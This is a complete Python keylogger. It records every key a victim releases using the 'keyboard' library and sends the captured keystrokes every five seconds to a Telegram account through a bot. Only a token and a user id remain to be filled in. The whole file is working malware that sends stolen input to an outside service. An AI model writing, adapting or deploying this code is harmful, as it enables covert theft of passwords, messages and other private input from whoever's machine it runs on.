from telebot import TeleBot
from time import sleep
import keyboard
from threading import Thread,RLock,Condition

# Set here the Telegram bot token
BOT_TOKEN = ""
bot = TeleBot(BOT_TOKEN)

class Log:
    def __init__(self):
        self.log = ""
        self.lock = RLock()
        self.condition = Condition(self.lock)
        # Set here the Telegram user id
        self.id = "0123456789"
       
    def add_to_log(self, log):
    	with self.lock:
    	    #print("Adding to log...")
    	    self.log += log
    	    self.condition.notify_all()
    
    def send_log(self):
        with self.lock:
            #print("Sending to bot...")
            while self.log == "":
                #print("Waiting resources...")
                self.condition.wait()
            #print("Sending message!")
            bot.send_message(self.id, self.log)
            self.log = ""

class Keylogger(Thread):

    def __init__(self, log):
        super().__init__()
        self.log = log
       
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = "[SPACE]"
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        #print(f"Keylogger add to log: {name}")
        self.log.add_to_log(name)
        
    def run(self):
        keyboard.on_release(callback=self.callback)

class Sender(Thread):

    def __init__(self, log):
        super().__init__()
        self.log = log
    
    def run(self):
        while True:
            sleep(5)
            #print("Sender send log")
            self.log.send_log()


log = Log()

keylogger = Keylogger(log)
keylogger.start()

sender = Sender(log)
sender.start()

bot.infinity_polling()
